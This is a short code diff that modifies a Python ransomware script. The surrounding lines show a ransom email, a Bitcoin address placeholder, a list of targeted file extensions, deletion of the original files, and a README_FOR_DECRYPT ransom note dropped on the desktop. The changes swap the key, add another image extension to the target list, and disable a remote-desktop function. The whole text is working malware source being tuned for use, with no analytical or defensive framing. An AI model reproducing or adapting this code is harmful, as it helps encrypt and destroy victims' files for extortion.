@@ -15,7 +15,7 @@ rmsbrand = 'Admin'
 email_con = 'XXXXX@mail.com'
 btc_address = 'XXXXXXXXXXXXXXXX'
 userhome = os.path.expanduser('~')
-key = "aGFja2xhYg=="
+key = "b3NjaGluYQ=="
 class colors:
         def __init__(self):
                 self.blue = "\033[94m"
@@ -143,6 +143,7 @@ extensions = ['txt',
               'rb',
               'png',
               'jpeg',
+	      'jfif',
               'p7c',
               'p7b',
               'p12',
@@ -278,7 +279,7 @@ for i in list_f:
 		os.remove(file_name)
 	except OSError:
 		pass
-create_remote_desktop()
+#create_remote_desktop()
 print("\n* Done *")
 write_instruction(get_desktop(), 'txt')
 os.startfile(get_desktop()+ '\\README_FOR_DECRYPT.txt')
